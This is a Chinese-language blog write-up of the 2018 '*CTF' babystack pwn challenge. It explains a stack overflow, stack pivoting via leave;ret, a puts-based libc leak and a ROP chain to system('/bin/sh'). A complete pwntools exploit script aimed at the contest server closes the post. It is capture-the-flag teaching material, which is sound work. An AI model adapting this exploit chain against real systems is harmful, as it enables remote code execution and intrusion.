---
layout: post
title: "*CTF babystack"
date: 2018-04-26
categories: jekyll update
---
### *CTF babystack

只有PIE没有开：
```
root@kali:~/Desktop/*ctf/babystack_# checksec bs
[*] '/root/Desktop/*ctf/babystack_/bs'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
刚看到的时候有点不知所措，后来才知道ebp是定了的，明显有栈溢出漏洞：

<img src="/images/posts/starctf/1524760272195.png" >

<img src="/images/posts/starctf/1524760361410.png" >

在我们仅仅只能够控制ebp的情况下，我们怎么才能够控制eip去拿到我们的shell呢。这里就可以利用译者栈迁移的操作来构造一个ebp链，利用puts打印泄露函数地址(libc地址)，而且题目给出了libc库，因此就有了system地址和binsh地址，然后再用read函数和ROP链来调用system就可以成功getshell了

栈迁移的参考资料：
+ https://blog.csdn.net/zszcr/article/details/79841848
+ https://blog.csdn.net/yuanyunfeng3/article/details/51456049
+ http://veritas501.space/2017/05/23/HITCON-training%20writeup/

栈迁移：通过将ebp覆盖成我们构造的`fake_ebp`(可以是一些数据段上的地址，只要可读可写就行了) ，然后利用`leave_ret`这个`gadget`将`esp`劫持到`fake_ebp`的地址上
leave_ret相当于：

    mov esp,ebp 
    pop ebp  
    pop eip


先找到可以控制rdi、rsi寄存器值的gadget
这里用了这俩：
```
0x0000000000400c03 : pop rdi ; ret
0x0000000000400c01 : pop rsi ; pop r15 ; ret
```
ROPgadget来找gadget
```
root@kali:~/Desktop/*ctf/babystack_# ROPgadget --binary bs --only "pop|ret"
Gadgets information
============================================================
0x0000000000400bfc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400bfe : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400c00 : pop r14 ; pop r15 ; ret
0x0000000000400c02 : pop r15 ; ret
0x0000000000400bfb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400bff : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400870 : pop rbp ; ret
0x0000000000400c03 : pop rdi ; ret
0x0000000000400c01 : pop rsi ; pop r15 ; ret
0x0000000000400bfd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400287 : ret
0x000000000040097e : ret 0x8b48

Unique gadgets found: 12
```

这里可以看下分析过程：
读入多少字节数17f0-->6128

<img src="/images/posts/starctf/1524756229230.png" >

看ebp链找到偏移量4112。

payload  写到栈上之后，ebp改变了

<img src="/images/posts/starctf/1524756202201.png" >

<img src="/images/posts/starctf/1524756275226.png" >

构造ROP链的payload

```
payload = p64(buf) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt)
payload += p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(buf+0x8) + p64(16) + p64(read_plt) + p64(leave)
```

第一个payload就是用puts来泄露libc地址，第二个payload就是调用read函数，以便后面泄露完libc地址后再传一次参数给假的栈上面，进而调用system的时候用的参数。

具体脚本：
```
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import hashlib
import itertools
import string
import os
#import time
r=remote("47.91.226.78", 10005)
#r = process("./bs",env = {'LD_PRELOAD':'./libc.so.6'})
elf = ELF("./bs")
libc = ELF("./libc.so.6")



def proofwork():
  r.recvuntil('sha256(xxxx+')
  a=r.recvline()
  print a
  proof=a.split(" ")[-1]
  x=a.split(")")[0]
  proof=proof.strip()
  print r.recvuntil("xxxx:\n")
  for i in itertools.product(string.ascii_letters+string.digits,repeat=4):
    test="".join(i)+x
    k=hashlib.sha256()
    k.update(test)
    if k.hexdigest()==proof:
      print "find"
      r.sendline("".join(i))
      break
proofwork()
     




main=0x4009e7
pop_rdi = 0x400c03  #pop rdi ; ret
pop_rsi = 0x400c01  #pop rsi ; pop r15 ; ret
read_plt = elf.plt['read']
#atoi_got = elf.got['atoi']
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
buf = 0x602f00
leave = 0x400955

log.info("read_plt addr: " + hex(read_plt))
log.info("puts_got addr: " + hex(puts_got))
log.info("puts_plt addr: " + hex(puts_plt))

payload = p64(buf) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt)
payload += p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(buf+0x8) + p64(16) + p64(read_plt) + p64(leave)


print r.recvuntil("How many bytes do you want to send?\n")
#pause()
r.sendline(str(6128))
#r.sendlineafter('send?\n', str(6128))
#pause()
r.send("a"*4112 + payload + "a"*(6128-4112-len(payload)))

r.recvuntil("It's time to say goodbye.\n")
#print r.recvline()
#libc.sym['puts']
bin_sh_offset = libc.search('/bin/sh').next()
system_offset = libc.sym['system']
libc_base=u64(r.recvline()[:6]+"\x00\x00") - libc.sym['puts']
log.info("puts_libc_offset addr: " + hex(libc.sym['puts']))
log.info("system_offset addr: " + hex(libc.sym['system']))
log.info("bin_sh_offset addr: " + hex(bin_sh_offset))
log.info("libc_base addr: " + hex(libc_base))

system = libc_base + system_offset
binsh = libc_base + bin_sh_offset

r.sendline(p64(pop_rdi)+p64(binsh)+p64(system))

r.interactive()

```